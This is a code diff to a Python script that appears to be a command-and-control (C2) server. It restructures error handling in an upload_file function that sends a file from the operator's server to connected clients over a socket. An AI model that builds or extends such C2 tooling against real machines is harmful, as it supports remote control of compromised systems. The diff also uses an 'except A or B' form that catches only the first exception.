@@ -195,11 +195,11 @@ def download_file(cmd,conn):
         print("File Download Stopped.")
 
 def upload_file(cmd,conn):
-    path = cmd.replace("up ","")
-    conn.send(("UPLOADING_FILE_FROM_S3RVER").encode())
-    if conn.recv(1024).decode() == "READY":
-        conn.send(path.encode())
-        try:
+    try:
+        path = cmd.replace("up ","")
+        conn.send(("UPLOADING_FILE_FROM_S3RVER").encode())
+        if conn.recv(1024).decode() == "READY":
+            conn.send(path.encode())
             with open(path,"rb") as f:
                 data = f.read(1024)
                 while data:
@@ -210,13 +210,15 @@ def upload_file(cmd,conn):
                         print("An error has occured!")
                         break
 
-            conn.send("UPLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
-            if conn.recv(1024).decode() == "DONE":
-                print("File uploaded successfully!")
+                conn.send("UPLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
+                if conn.recv(1024).decode() == "DONE":
+                    print("File uploaded successfully!")
 
-        except FileNotFoundError or FileExistsError as e:
-            conn.send("UPLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
-            print("File not found! \n"+ str(e))
+    except FileNotFoundError or FileExistsError as e:
+        conn.send("UPLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
+        print("File not found! \n"+ str(e))
+    except KeyboardInterrupt:
+        print("File Upload Stopped.")
 
 
 #Start server as a thread to constantly accept new clients, then open the C2 console.
